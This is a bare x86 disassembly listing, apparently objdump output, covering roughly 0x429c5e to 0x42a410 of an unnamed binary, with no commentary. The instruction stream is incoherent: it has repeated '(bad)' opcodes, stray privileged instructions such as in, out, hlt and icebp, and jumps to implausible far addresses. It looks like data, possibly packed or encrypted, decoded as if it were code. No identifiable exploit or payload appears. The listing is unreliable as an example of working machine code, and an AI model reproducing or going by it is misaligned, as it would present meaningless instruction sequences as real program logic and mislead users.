  429c5e:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  429c65:	push   WORD PTR [ecx+0x8]
  429c69:	jne    0x429c2c
  429c6b:	ud0    ecx,DWORD PTR [ecx]
  429c6e:	mov    esi,DWORD PTR [edx]
  429c70:	lods   al,BYTE PTR ds:[esi]
  429c71:	add    BYTE PTR [eax],al
  429c73:	data16 (bad) 
  429c75:	iret   
  429c76:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  429c7d:	cli    
  429c7e:	inc    ebp
  429c7f:	cmp    al,0x8d
  429c81:	add    BYTE PTR [esi+0x2d],ah
  429c84:	inc    ebp
  429c85:	pop    ebp
  429c86:	lea    ecx,[edi]
  429c88:	mov    dl,bh
  429c8a:	add    BYTE PTR [edi],cl
  429c8c:	mov    DWORD PTR [eax+eax*8],edi
  429c8f:	mov    ebx,0x3a87
  429c94:	add    BYTE PTR [ebx],ch
  429c96:	inc    ebp
  429c97:	data16 (bad) 
  429c99:	clc    
  429c9a:	int3   
  429c9b:	cmp    eax,DWORD PTR [eax]
  429c9d:	je     0x429c28
  429c9f:	push   0xffffffc8
  429ca1:	pop    edi
  429ca2:	xchg   DWORD PTR [ebp+0x0],eax
  429ca5:	data16 add BYTE PTR [ebp+0x45],cl
  429ca9:	lea    cx,[ebp+0x10]
  429cad:	jb     0x429caf
  429caf:	jmp    0x429c3a
  429cb1:	call   eax
  429cb3:	clc    
  429cb4:	xchg   DWORD PTR [edi+0x1],edi
  429cb7:	mov    eax,DWORD PTR [eax]
  429cb9:	or     BYTE PTR [ebp-0x49],al
  429cbc:	lea    eax,[eax+0x74003154]
  429cc2:	push   edi
  429cc3:	inc    edx
  429cc4:	jge    0x429cc5
  429cc6:	mov    DWORD PTR [edi],ecx
  429cc8:	fdiv   DWORD PTR [edi-0x6]
  429ccb:	inc    DWORD PTR [eax]
  429ccd:	xor    edx,DWORD PTR [eax+0x5f]
  429cd0:	xchg   DWORD PTR [ebx+0x1],ebx
  429cd3:	ret    0x0
  429cd6:	xor    BYTE PTR [ebp-0x51],cl
  429cd9:	cmp    edi,0xf0ff8904
  429cdf:	data16 ror al,0x84
  429ce3:	rol    BYTE PTR [eax],0x3b
  429ce6:	add    al,dh
  429ce8:	dec    eax
  429ce9:	xchg   esp,eax
  429cea:	push   ebx
  429ceb:	jmp    0x429c78
  429ced:	push   ebp
  429cee:	add    esp,ebp
  429cf0:	add    ebp,esp
  429cf2:	mov    edx,DWORD PTR [edi+0x24]
  429cf5:	clc    
  429cf6:	dec    esi
  429cf7:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  429cfd:	cmp    BYTE PTR [ebx],al
  429cff:	jne    0x429c8a
  429d01:	xor    esp,eax
  429d03:	jmp    0x459e86
  429d08:	add    ebp,DWORD PTR [ecx+ecx*4]
  429d0b:	jne    0x429d01
  429d0d:	call   0xffcc9a67
  429d12:	clc    
  429d13:	xchg   edi,eax
  429d14:	sti    
  429d15:	add    DWORD PTR [ebx],eax
  429d17:	add    BYTE PTR [ebp+0x47],bl
  429d1a:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  429d20:	pop    ebp
  429d21:	mov    DWORD PTR [esi-0x48],esi
  429d24:	jmp    0x429d6d
  429d26:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  429d2c:	(bad)  
  429d2e:	cmp    al,0x0
  429d30:	cmp    eax,DWORD PTR [ebp+0x18]
  429d33:	lea    ebx,[ebp-0x56]
  429d36:	jle    0x429d38
  429d38:	jae    0x429cc3
  429d3a:	mov    eax,esp
  429d3c:	call   0xb900:0x8b005587
  429d43:	inc    ebp
  429d44:	push   ebp
  429d45:	lea    ecx,[ebp-0x27ff4f12]
  429d4b:	mov    eax,edi
  429d4d:	int3   
  429d4e:	push   ebp
  429d4f:	xchg   edi,eax
  429d51:	add    esp,ebp
  429d53:	add    BYTE PTR [eax],al
  429d55:	inc    ebp
  429d56:	add    BYTE PTR [ebp+0x8b3255],cl
  429d5c:	cld    
  429d5d:	mov    DWORD PTR [edx],edi
  429d5f:	aam    0x75
  429d61:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  429d67:	mov    DWORD PTR [ebx-0x50],edx
  429d6a:	test   BYTE PTR [ebp-0x1],0xe8
  429d6e:	mov    eax,DWORD PTR [eax]
  429d70:	hlt    
  429d71:	add    al,al
  429d73:	mov    eax,DWORD PTR ds:0x890045a8
  429d79:	dec    DWORD PTR [ebx+0x45fdf0e8]
  429d7f:	inc    DWORD PTR [eax*2+0xf75854d]
  429d86:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  429d8c:	call   0x7298facd
  429d91:	je     0x429df1
  429d93:	js     0x429df4
  429d95:	lock ret 0x7e
  429d99:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  429d9f:	mov    edi,edi
  429da1:	sbb    al,bl
  429da3:	clc    
  429da4:	add    BYTE PTR [ebp-0x73],bh
  429da7:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  429dad:	ror    BYTE PTR [eax],1
  429daf:	dec    ebp
  429db0:	xchg   ebp,eax
  429db1:	mov    edi,edi
  429db3:	in     al,0x8b
  429db5:	jge    0x429d40
  429db7:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  429dbd:	clc    
  429dbe:	pop    esi
  429dbf:	fist   DWORD PTR [ebp+0x5d398b5d]
  429dc5:	clc    
  429dc6:	add    al,0x6e
  429dc8:	mov    eax,DWORD PTR [ebx]
  429dca:	mov    BYTE PTR [ebp+0x0],dl
  429dcd:	mov    edx,DWORD PTR [ebx-0x20]
  429dd0:	adc    esi,DWORD PTR [edi+0x5e005f36]
  429dd6:	add    eax,0x3b3a73
  429ddb:	adc    al,0x89
  429ddd:	pop    eax
  429dde:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  429de2:	ret    0xf08
  429de5:	cmp    al,0x2
  429de7:	mov    DWORD PTR [edx],esi
  429de9:	cld    
  429dea:	add    BYTE PTR [ebp+0x66],dl
  429ded:	add    eax,ebx
  429def:	add    esp,eax
  429df1:	sub    eax,eax
  429df3:	or     BYTE PTR [ecx-0x77f474bb],cl
  429df9:	add    BYTE PTR [eax],al
  429dfb:	mov    DWORD PTR [ebx-0x24],ebx
  429dfe:	push   edi
  429dff:	push   ebp
  429e00:	clc    
  429e01:	add    DWORD PTR [esi+0x1b0100],0x45
  429e08:	out    0xff,eax
  429e0a:	add    edx,DWORD PTR [eax]
  429e0c:	jmp    0x429df6
  429e0e:	cmp    ch,0x43
  429e11:	(bad)  
  429e12:	jmp    0x40c82664
  429e17:	je     0x429da3
  429e19:	mov    eax,DWORD PTR [eax-0x10c78704]
  429e1f:	inc    ebp
  429e20:	add    BYTE PTR [ebx-0x770375],al
  429e26:	add    ah,ch
  429e28:	add    edx,esp
  429e2a:	pop    edi
  429e2b:	pop    ebp
  429e2c:	push   ebp
  429e2d:	inc    ebx
  429e2e:	in     al,dx
  429e2f:	pop    ebp
  429e30:	in     al,dx
  429e31:	cmp    edx,DWORD PTR [edi-0x8]
  429e34:	cmp    BYTE PTR [esp+ebx*4-0x173676a5],dl
  429e3b:	add    al,0x47
  429e3d:	push   ebp
  429e3e:	mov    esp,ebp
  429e40:	in     al,0x45
  429e42:	dec    ebp
  429e43:	push   esi
  429e44:	test   DWORD PTR [eax+0xff010f],esi
  429e4a:	add    BYTE PTR [eax+0xc018b],dh
  429e50:	leave  
  429e51:	inc    ebp
  429e52:	test   al,ch
  429e54:	add    dh,bh
  429e56:	add    bh,bh
  429e58:	dec    ebp
  429e59:	push   cs
  429e5a:	mov    DWORD PTR [ecx],eax
  429e5c:	hlt    
  429e5d:	push   es
  429e5e:	dec    ebp
  429e5f:	leave  
  429e60:	mov    DWORD PTR [eax],ecx
  429e62:	clc    
  429e63:	cmovge eax,ecx
  429e66:	mov    ecx,0x85c2f0
  429e6c:	clc    
  429e6d:	pop    DWORD PTR [ebp+0x1]
  429e70:	aas    
  429e71:	add    BYTE PTR [ebx+ebp*8-0x7582caad],bl
  429e78:	push   esi
  429e79:	add    BYTE PTR [ebp-0x4],al
  429e7c:	mov    DWORD PTR [eax],eax
  429e7e:	cld    
  429e7f:	inc    bp
  429e81:	add    DWORD PTR [edx],edi
  429e83:	rcr    DWORD PTR [ebx+eax*4-0x48f7fd42],0x7
  429e8b:	mov    ebx,0xcd4f68
  429e90:	mov    edi,DWORD PTR [ebx]
  429e92:	or     al,0x75
  429e94:	(bad)  
  429e95:	xor    ecx,ebx
  429e97:	enterw 0x4d01,0x87
  429e9c:	jmp    0x429ea2
  429ea1:	ret    
  429ea2:	inc    ebp
  429ea3:	mov    ecx,DWORD PTR [ebx-0x3977f375]
  429ea9:	add    dh,cl
  429eab:	ror    DWORD PTR [esi+eax*1+0xa64c730],0x8b
  429eb3:	icebp  
  429eb4:	or     BYTE PTR [eax+0x8f13bd2],al
  429eba:	inc    ebp
  429ebb:	inc    edx
  429ebc:	mov    ecx,DWORD PTR [edx]
  429ebe:	or     al,0xf9
  429ec0:	(bad)  
  429ec1:	jne    0x429e91
  429ec3:	mov    cl,0x0
  429ec6:	rol    BYTE PTR [esi+0x450134],1
  429ecc:	add    eax,edi
  429ece:	cld    
  429ecf:	ret    
  429ed0:	dec    ebp
  429ed1:	mov    ecx,DWORD PTR [edx+0x751c8583]
  429ed7:	mov    edi,0xf82c8534
  429edc:	jmp    0x429f5b
  429ede:	mov    ecx,DWORD PTR [ebp+0x45f101f0]
  429ee4:	mov    dl,0x8b
  429ee6:	sub    cl,BYTE PTR [eax]
  429ee8:	mov    ecx,ecx
  429eea:	in     al,dx
  429eeb:	test   cl,dh
  429eed:	add    BYTE PTR [edx],al
  429eef:	add    BYTE PTR [eax-0x377a97b3],al
  429ef5:	cmovge esi,esp
  429ef8:	add    eax,DWORD PTR [eax]
  429efa:	cld    
  429efb:	mov    eax,DWORD PTR [ecx]
  429efd:	adc    BYTE PTR [ebp+0x4d],cl
  429f00:	mov    ecx,DWORD PTR [ebx+0x4d980ce8]
  429f06:	xor    cl,BYTE PTR [ebx+0x4533082b]
  429f0c:	cmp    esp,ebx
  429f0e:	jne    0x429eac
  429f10:	mov    eax,edi
  429f12:	adc    ah,ch
  429f14:	push   ebp
  429f15:	test   DWORD PTR [ebx],esi
  429f17:	clc    
  429f18:	xor    ecx,DWORD PTR [ecx-0x76d417d5]
  429f1e:	xor    ecx,DWORD PTR [ecx+ecx*4]
  429f21:	dec    ebp
  429f22:	adc    bh,al
  429f24:	push   0x8b85ff10
  429f29:	clc    
  429f2a:	or     al,0x50
  429f2c:	(bad)  
  429f2d:	push   ecx
  429f2e:	retf   
  429f2f:	mov    ebx,0xff4d8dc8
  429f34:	mov    DWORD PTR [ebp+0x8],eax
  429f37:	xor    eax,DWORD PTR [ebp-0x75]
  429f3a:	cmp    ebp,DWORD PTR [ebx]
  429f3c:	lsl    ebx,WORD PTR [edi-0x8]
  429f40:	call   DWORD PTR [ebx-0x741bff75]
  429f46:	(bad)  
  429f47:	or     al,0x5b
  429f49:	dec    ebp
  429f4a:	or     BYTE PTR [ebx],dh
  429f4c:	inc    ebp
  429f4d:	xor    esi,DWORD PTR ds:0x708088d
  429f53:	in     eax,0x98
  429f55:	add    BYTE PTR [edx],dh
  429f57:	inc    ebp
  429f58:	pop    edi
  429f59:	xor    eax,edx
  429f5b:	test   DWORD PTR [eax],0x81108b8b
  429f61:	dec    ebp
  429f62:	sub    al,0x33
  429f64:	add    BYTE PTR [ebx],dh
  429f66:	push   esi
  429f67:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  429f6d:	mov    edi,eax
  429f6f:	or     BYTE PTR [ebp+0x45],al
  429f72:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  429f78:	cmp    cl,cl
  429f7a:	pushf  
  429f7b:	push   es
  429f7c:	mov    DWORD PTR [ebx-0x4],0xf817853b
  429f83:	dec    ebp
  429f84:	inc    ebp
  429f85:	and    BYTE PTR [eax],0x50
  429f88:	pushf  
  429f89:	push   0x4de4d1c7
  429f8e:	xchg   BYTE PTR [eax-0x3dbaaf08],al
  429f94:	fsubr  st,st(1)
  429f96:	xlat   BYTE PTR ds:[ebx]
  429f97:	rol    bh,cl
  429f99:	mov    edx,esp
  429f9b:	or     BYTE PTR [ebp+0x4588f84d],al
  429fa1:	mov    ecx,DWORD PTR [eax]
  429fa3:	or     BYTE PTR [eax],al
  429fa5:	push   ebp
  429fa6:	mov    edi,DWORD PTR [eax+0xfc728b]
  429fac:	dec    ebp
  429fad:	enter  0xceba,0x8
  429fb1:	retf   0x1807
  429fb4:	ret    0x984d
  429fb7:	mov    esi,DWORD PTR [edx]
  429fb9:	or     al,0x33
  429fbb:	into   
  429fbc:	add    edx,esi
  429fbe:	add    ecx,edx
  429fc0:	bswap  eax
  429fc2:	ror    esi,0x98
  429fc5:	dec    ebp
  429fc6:	add    cl,ch
  429fc8:	mov    edi,edi
  429fca:	hlt    
  429fcb:	inc    esi
  429fcd:	inc    ebp
  429fce:	ret    0x4533
  429fd1:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  429fd7:	or     BYTE PTR [ebx],dh
  429fd9:	dec    ebp
  429fda:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  429fe0:	jne    0xff8c9fa7
  429fe6:	inc    ebp
  429fe7:	inc    ebp
  429fe8:	mov    esi,DWORD PTR [ebx]
  429fea:	clc    
  429feb:	pop    esi
  429fec:	ret    0xcaeb
  429fef:	mov    eax,esi
  429ff1:	call   0x5203f0c4
  429ff6:	dec    ebp
  429ff7:	add    eax,0xf8728b
  429ffc:	adc    eax,0xce0ccac9
  42a001:	push   ebp
  42a002:	ret    0xc6ec
  42a005:	in     al,dx
  42a006:	call   0x3342ed0f
  42a00b:	push   edi
  42a00c:	add    edi,eax
  42a00e:	xor    eax,eax
  42a010:	jmp    0x42a057
  42a012:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  42a018:	add    eax,edi
  42a01a:	shr    eax,cl
  42a01c:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  42a022:	mov    edi,DWORD PTR [ecx]
  42a024:	in     al,dx
  42a025:	pushf  
  42a026:	ret    0x84c7
  42a029:	fcomp  DWORD PTR [eax-0x7607cd7b]
  42a02f:	inc    ebp
  42a030:	in     al,dx
  42a031:	cmp    BYTE PTR [ebp-0x64],al
  42a034:	mov    eax,edi
  42a036:	cld    
  42a037:	fmul   st(2),st
  42a039:	sbb    dl,al
  42a03b:	jmp    0x9c3b:0x374d45c1
  42a042:	jbe    0x42a00b
  42a044:	mov    esp,eax
  42a046:	clc    
  42a047:	add    BYTE PTR [ebp+0x0],cl
  42a04a:	mov    ecx,ecx
  42a04c:	lea    eax,[ebp-0x5]
  42a04f:	mov    edi,edi
  42a051:	call   0x51cdf09b
  42a056:	hlt    
  42a057:	xor    eax,edx
  42a059:	mov    esi,0x987284
  42a05e:	xor    cl,dl
  42a060:	mov    esi,eax
  42a062:	hlt    
  42a063:	into   
  42a064:	inc    ebp
  42a065:	scas   eax,DWORD PTR es:[edi]
  42a066:	mov    ebp,ecx
  42a068:	cld    
  42a069:	add    dl,cl
  42a06b:	add    dl,al
  42a06d:	inc    ebp
  42a06e:	shr    DWORD PTR [ebx],0x4d
  42a071:	xor    edi,DWORD PTR [ebx]
  42a073:	mov    DWORD PTR [edi],ecx
  42a075:	clc    
  42a076:	dec    esi
  42a077:	inc    ebp
  42a078:	dec    DWORD PTR [ebx-0x3d2b1775]
  42a07e:	ret    0xc6ca
  42a081:	mov    BYTE PTR [ebp-0x32],0x53
  42a085:	scas   eax,DWORD PTR es:[edi]
  42a086:	inc    ebp
  42a087:	jmp    0x42a0c0
  42a089:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  42a090:	pop    ebx
  42a091:	xor    ecx,DWORD PTR [ebp+0x3]
  42a094:	mov    eax,DWORD PTR [ebx]
  42a096:	clc    
  42a097:	test   edx,ecx
  42a099:	mov    ecx,esi
  42a09b:	cld    
  42a09c:	call   0x8ab6e5e6
  42a0a1:	xor    ecx,DWORD PTR [eax+0x4533f303]
  42a0a7:	add    ecx,DWORD PTR [ebx-0x4974072d]
  42a0ad:	fdiv   QWORD PTR [ebx]
  42a0af:	retf   0xce89
  42a0b2:	in     al,0xc1
  42a0b4:	inc    ebp
  42a0b5:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  42a0bb:	into   
  42a0bc:	mov    dh,0xc1
  42a0bf:	call   0x8c16e648
  42a0c4:	(bad)  
  42a0c5:	cld    
  42a0c6:	mov    ecx,DWORD PTR [ebp-0x14]
  42a0c9:	xor    eax,ecx
  42a0cb:	lea    eax,[ebp+0x8]
  42a0ce:	mov    esi,DWORD PTR [edx-0x4]
  42a0d1:	add    dl,al
  42a0d3:	inc    ebp
  42a0d4:	mov    esp,0x32d8988b
  42a0d9:	dec    ebp
  42a0da:	mov    esi,DWORD PTR [ebx]
  42a0dc:	cld    
  42a0dd:	xor    eax,edx
  42a0df:	sub    ebp,DWORD PTR [eax-0x75]
  42a0e2:	int    0xec
  42a0e4:	sub    ecx,eax
  42a0e6:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  42a0ec:	mov    esi,esp
  42a0ee:	call   0x3416ee77
  42a0f3:	inc    DWORD PTR [ebx]
  42a0f5:	mov    edi,DWORD PTR [ebx]
  42a0f7:	cld    
  42a0f8:	jne    0x42a147
  42a0fa:	mov    esi,DWORD PTR [ebx]
  42a0fc:	aam    0x8d
  42a0fe:	dec    ebp
  42a0ff:	or     BYTE PTR [ebx],dh
  42a101:	jb     0x42a106
  42a103:	add    BYTE PTR [edi+0x45],bl
  42a106:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  42a10d:	xor    ebp,esp
  42a10f:	xor    eax,edi
  42a111:	sub    edi,esp
  42a113:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  42a119:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  42a120:	inc    ebp
  42a121:	xor    ecx,DWORD PTR [ecx+0x45891403]
  42a127:	clc    
  42a128:	mov    eax,edi
  42a12a:	nop
  42a12b:	fadd   QWORD PTR [eax]
  42a12d:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  42a133:	jmp    0x42a0be
  42a135:	mov    eax,DWORD PTR [ecx]
  42a137:	fadd   DWORD PTR [eax]
  42a139:	inc    ebp
  42a13a:	or     DWORD PTR [ebx],esi
  42a13c:	dec    eax
  42a13d:	add    edx,DWORD PTR [ebx-0x2d]
  42a140:	dec    ebp
  42a141:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  42a147:	inc    ebp
  42a148:	push   eax
  42a149:	mov    dl,BYTE PTR [ecx-0xd]
  42a14c:	xor    ecx,DWORD PTR [ebp-0x45]
  42a14f:	(bad)  
  42a151:	rol    BYTE PTR [eax],0xc1
  42a154:	ret    
  42a155:	inc    ebp
  42a156:	inc    ebp
  42a157:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  42a15d:	xor    eax,ebx
  42a15f:	add    eax,DWORD PTR [ebp+0x23]
  42a162:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  42a168:	cmp    edi,0xc
  42a16b:	dec    ebp
  42a16c:	inc    ebp
  42a16d:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  42a173:	inc    ebp
  42a174:	mov    esi,DWORD PTR [ebx]
  42a176:	clc    
  42a177:	lea    eax,[ebp+0x45725407]
  42a17d:	add    BYTE PTR [ebp+eax*2-0x75],dh
  42a181:	xor    edi,DWORD PTR [eax]
  42a183:	mov    ecx,0xff8b8d4d
  42a188:	push   esp
  42a189:	enter  0x4df7,0x23
  42a18d:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  42a193:	mov    eax,DWORD PTR [ebx]
  42a195:	loopne 0x42a182
  42a197:	ret    0xc68b
  42a19a:	push   esp
  42a19b:	enter  0x9745,0x8b
  42a19f:	inc    ebp
  42a1a0:	cld    
  42a1a1:	mov    eax,edi
  42a1a3:	clc    
  42a1a4:	ret    
  42a1a5:	ret    0xc645
  42a1a8:	mov    esi,DWORD PTR [ebx]
  42a1aa:	cld    
  42a1ab:	pop    esi
  42a1ac:	mov    ebx,0x83458bc3
  42a1b2:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  42a1b6:	dec    ebp
  42a1b7:	cmp    BYTE PTR [ebx],dh
  42a1b9:	pushf  
  42a1ba:	add    edi,DWORD PTR [edx-0x7767a77]
  42a1c0:	fcom   DWORD PTR [ebp+0x45]
  42a1c3:	mov    edi,DWORD PTR [edx]
  42a1c5:	adc    al,0x9c
  42a1c7:	inc    ebp
  42a1c8:	(bad)  
  42a1c9:	mov    ebx,eax
  42a1cb:	adc    al,0x85
  42a1cd:	cmp    al,0x1
  42a1d0:	inc    ebp
  42a1d1:	add    BYTE PTR [ecx*2-0x74167464],bh
  42a1d8:	add    edx,DWORD PTR [eax-0x74bb0000]
  42a1de:	xor    eax,DWORD PTR [ebx]
  42a1e0:	add    edi,DWORD PTR [ecx+ecx*4]
  42a1e3:	mov    esp,esi
  42a1e5:	clc    
  42a1e6:	inc    ebp
  42a1e7:	inc    ebp
  42a1e8:	add    edx,DWORD PTR [esi+0xc]
  42a1eb:	mov    edi,0x7ff0845
  42a1f0:	in     al,dx
  42a1f1:	(bad)  
  42a1f2:	jne    0x42a18c
  42a1f4:	mov    esi,DWORD PTR [edx]
  42a1f6:	clc    
  42a1f7:	add    ebp,DWORD PTR [edx]
  42a1f9:	mov    edi,edi
  42a1fb:	in     al,dx
  42a1fc:	mov    DWORD PTR [ebp-0x10],eax
  42a1ff:	xor    eax,DWORD PTR [ebp+0x3]
  42a202:	and    BYTE PTR [ecx+0x458bf49c],cl
  42a208:	fmul   DWORD PTR [ebx-0x173caf39]
  42a20e:	lea    ecx,[ecx+0x45e8d4bc]
  42a214:	clc    
  42a215:	mov    edi,edi
  42a217:	cmp    BYTE PTR [ebp+0x4d],al
  42a21a:	test   DWORD PTR [eax+0x74],ecx
  42a21d:	inc    ecx
  42a21e:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  42a224:	ret    
  42a225:	inc    eax
  42a226:	dec    DWORD PTR [ebx+0x4945f8f0]
  42a22c:	push   eax
  42a22d:	dec    eax
  42a22e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a22f:	sar    bh,1
  42a231:	enter  0x458b,0xec
  42a235:	mov    eax,DWORD PTR [ebp+0x38]
  42a238:	mov    eax,ecx
  42a23a:	fadd   DWORD PTR [ebx]
  42a23c:	dec    ebp
  42a23d:	inc    eax
  42a23e:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  42a244:	inc    ebp
  42a245:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  42a24b:	fadd   QWORD PTR [ebx]
  42a24d:	inc    ebp
  42a24e:	or     al,0x33
  42a250:	dec    ebp
  42a251:	add    edi,DWORD PTR [ebx]
  42a253:	mov    DWORD PTR [edx-0x28],esi
  42a256:	mov    eax,DWORD PTR [ebp-0x10]
  42a259:	mov    eax,DWORD PTR [eax+0x10]
  42a25c:	mov    eax,edi
  42a25e:	lock ret 
  42a260:	inc    ecx
  42a261:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  42a267:	fsubr  st,st(5)
  42a269:	test   DWORD PTR [eax],eax
  42a26b:	clc    
  42a26c:	push   0x45
  42a26e:	(bad)  
  42a26f:	cmp    ebp,esp
  42a271:	pushf  
  42a272:	inc    ebp
  42a273:	(bad)  
  42a274:	push   eax
  42a275:	fcomp  DWORD PTR [ebp+eax*4-0x1]
  42a279:	clc    
  42a27a:	mov    eax,0xf8008584
  42a27f:	mov    eax,DWORD PTR [ebp-0x4]
  42a282:	mov    edi,0x4585c3cc
  42a288:	clc    
  42a289:	mov    eax,DWORD PTR [ebp+0x14]
  42a28c:	cmp    al,BYTE PTR [ebp-0x64]
  42a28f:	mov    edi,eax
  42a291:	in     al,dx
  42a292:	les    esi,FWORD PTR [ebp-0x7b]
  42a295:	mov    edi,eax
  42a297:	or     al,0x4d
  42a299:	dec    ebp
  42a29a:	mov    eax,ebp
  42a29c:	in     al,0xf2
  42a29e:	dec    ebp
  42a29f:	dec    DWORD PTR [ecx+0x4dc7e045]
  42a2a5:	fmul   DWORD PTR [ecx+0x4df8f085]
  42a2ab:	inc    ebp
  42a2ac:	mov    DWORD PTR [ebx],esi
  42a2ae:	fadd   QWORD PTR [ebx]
  42a2b0:	dec    ebp
  42a2b1:	push   eax
  42a2b2:	xor    eax,DWORD PTR [ebp+0x3]
  42a2b5:	push   eax
  42a2b6:	mov    DWORD PTR [eax],ebx
  42a2b8:	fdivr  st,st(7)
  42a2ba:	test   BYTE PTR [ebx-0x3fc21000],0x85
  42a2c1:	dec    esi
  42a2c2:	clc    
  42a2c3:	inc    ebp
  42a2c4:	test   BYTE PTR [ebx],dh
  42a2c6:	add    DWORD PTR [ebx],eax
  42a2c8:	add    BYTE PTR [eax+0x4d],dl
  42a2cb:	jne    0x42a300
  42a2cd:	lea    ecx,[ebx-0x7617fc44]
  42a2d3:	div    ah
  42a2d5:	inc    DWORD PTR [ebp+0x45]
  42a2d8:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  42a2de:	jb     0x42a26b
  42a2e0:	add    BYTE PTR [eax*2-0x17ba743f],cl
  42a2e7:	mov    ecx,DWORD PTR [ebp-0x10]
  42a2ea:	xor    ecx,DWORD PTR [ebp+0x3]
  42a2ed:	mov    edi,DWORD PTR [ebx]
  42a2ef:	adc    BYTE PTR [ebp+0x41],dh
  42a2f2:	mov    ecx,DWORD PTR [ebx-0x37382704]
  42a2f8:	ret    
  42a2f9:	push   ss
  42a2fa:	push   0x45
  42a2fc:	lea    ecx,[ebx+0x4de80cb0]
  42a302:	sti    
  42a303:	add    edi,edi
  42a305:	or     BYTE PTR [ebp+0x4d],al
  42a308:	mov    ebp,DWORD PTR [ebx]
  42a30a:	xor    ebp,ecx
  42a30c:	mov    al,BYTE PTR [edx]
  42a30e:	add    eax,0xc7200
  42a313:	jne    0x42a362
  42a315:	lea    esi,[ebx]
  42a317:	mov    al,0xf
  42a319:	call   0xe99de
  42a31e:	sar    DWORD PTR [eax],0x84
  42a321:	pushf  
  42a322:	add    DWORD PTR [ecx+0x4545d000],ecx
  42a328:	mov    edi,DWORD PTR [ecx]
  42a32a:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  42a331:	test   DWORD PTR [eax],eax
  42a333:	clc    
  42a334:	dec    ebp
  42a335:	inc    ebp
  42a336:	xor    edi,DWORD PTR [ebx]
  42a338:	setl   al
  42a33b:	(bad)  
  42a33c:	retf   
  42a33d:	rol    cl,1
  42a33f:	dec    ebp
  42a340:	test   BYTE PTR [ebp+0x4d00cc01],cl
  42a346:	inc    ebp
  42a347:	lea    ecx,[ebx-0x75b2cc38]
  42a34d:	lea    eax,ds:0x4d72c4
  42a353:	mov    ecx,DWORD PTR [ebp-0x4]
  42a356:	xor    ecx,edi
  42a358:	bswap  ebx
  42a35a:	ror    BYTE PTR [ebp-0x35],0xe9
  42a35e:	rol    DWORD PTR [ecx],0x84
  42a361:	add    BYTE PTR [ecx],al
  42a363:	cmp    al,BYTE PTR [eax]
  42a365:	pushf  
  42a366:	inc    ebp
  42a367:	jnp    0x8a42d76a
  42a36d:	mov    eax,DWORD PTR ds:0xcf72e8
  42a373:	lock dec ebp
  42a375:	retf   
  42a376:	xor    ecx,DWORD PTR [ebp+0xf]
  42a379:	mov    eax,eax
  42a37b:	fmul   st,st(3)
  42a37d:	test   ecx,0x1988484
  42a383:	xor    al,BYTE PTR [eax]
  42a385:	mov    DWORD PTR [ebp-0x28],eax
  42a388:	mov    eax,DWORD PTR [ebp+0x33]
  42a38b:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  42a391:	ret    
  42a392:	add    al,cl
  42a394:	dec    ebp
  42a395:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  42a39b:	add    ecx,DWORD PTR ds:0xc7250
  42a3a1:	inc    ebp
  42a3a2:	rcl    DWORD PTR [eax+0x4d],0x27
  42a3a6:	mov    edi,edi
  42a3a8:	xor    ecx,DWORD PTR [ebx+0xde48a]
  42a3ae:	jb     0x42a377
  42a3b0:	add    BYTE PTR [ecx+eax*8-0x74cdb2b8],al
  42a3b7:	mov    esi,DWORD PTR [ebx]
  42a3b9:	cld    
  42a3ba:	mov    cl,bh
  42a3bc:	or     eax,0x372b6
  42a3c1:	cmp    ecx,eax
  42a3c3:	jne    0x42a440
  42a3c9:	mov    eax,DWORD PTR [ebp-0x20]
  42a3cc:	mov    eax,DWORD PTR [eax]
  42a3ce:	xor    eax,edi
  42a3d0:	mov    al,BYTE PTR [ebp+eax*1+0x327248]
  42a3d7:	mov    ecx,DWORD PTR [ebp-0x4]
  42a3da:	mov    ecx,edi
  42a3dc:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a3e2:	jb     0x42a3f3
  42a3e4:	add    BYTE PTR [edi-0x3f],dl
  42a3e7:	add    BYTE PTR [ebp-0x75],cl
  42a3ea:	mov    esi,eax
  42a3ec:	xor    eax,DWORD PTR [eax]
  42a3ee:	mov    al,bh
  42a3f0:	or     eax,0x487284
  42a3f5:	xor    al,cl
  42a3f7:	mov    ecx,DWORD PTR [ebp-0x4]
  42a3fa:	mov    ecx,edi
  42a3fc:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a402:	jb     0x42a413
  42a404:	add    BYTE PTR [edi],dh
  42a406:	enter  0x8500,0x8b
  42a40a:	add    ah,bl
  42a40c:	add    BYTE PTR [eax],al
  42a40e:	inc    ebp
  42a40f:	(bad)  
  42a410:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a48]
